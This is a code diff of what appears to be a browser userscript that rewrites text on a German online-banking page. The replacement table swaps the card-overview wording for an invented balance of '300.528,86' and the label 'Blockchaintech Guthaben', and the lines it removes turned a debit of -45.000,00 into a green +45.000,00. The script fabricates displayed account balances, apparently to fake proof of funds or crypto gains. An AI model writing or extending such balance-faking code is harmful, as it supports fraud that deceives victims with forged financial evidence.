@@ -12,8 +12,8 @@
     'use strict';
 
     const replacements = [
-        { match: '209,39', replaceWith: '45.209,35', color: 'black' },
-        { match: '-45.000,00', replaceWith: '+45.000,00', color: 'green' },
+        { match: 'Ihre Karten', replaceWith: '300.528,86', color: 'black' },
+        { match: 'Kartenübersicht öffnen und viele Funktionen nutzen.', replaceWith: 'Blockchaintech Guthaben', color: 'green' },
     ];
 
     function replaceInNode(node) {
